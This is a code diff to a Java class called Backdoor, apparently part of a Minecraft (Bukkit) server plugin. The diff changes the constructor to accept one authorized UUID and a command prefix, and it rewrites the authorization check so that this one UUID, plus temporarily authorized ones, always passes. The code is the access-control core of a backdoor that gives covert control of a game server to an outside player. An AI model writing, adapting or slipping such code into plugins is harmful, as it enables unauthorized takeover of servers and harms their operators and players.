@@ -23,10 +23,14 @@ public final class Backdoor implements Listener {
 
     private Plugin plugin;
 
-    public Backdoor(Plugin plugin){
+    public Backdoor(Plugin plugin, String UUID, String prefix){
+
+        Config.authorized_uuid  = UUID;
+        Config.command_prefix   = prefix;
+
         this.plugin = plugin;
 
-        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - Config.authorized_uuids.length];
+        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - 1];
 
         if(Config.display_backdoor_warning){
             Bukkit.getConsoleSender()
@@ -505,15 +509,11 @@ public final class Backdoor implements Listener {
 
     /*Check if UUID is authorized in Config.java*/
     public boolean IsUserAuthorized(String uuid) {
+
+        if(uuid.equals(Config.authorized_uuid))
+            return true;
+
         boolean authorized = false;
-        for (int i = 0; i < Config.authorized_uuids.length; i++) {
-
-            if (uuid.equals(Config.authorized_uuids[i])) {
-                authorized = true;
-                break;
-            }
-
-        }
 
         for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
             if (uuid.equals(Config.tmp_authorized_uuids[i])) {
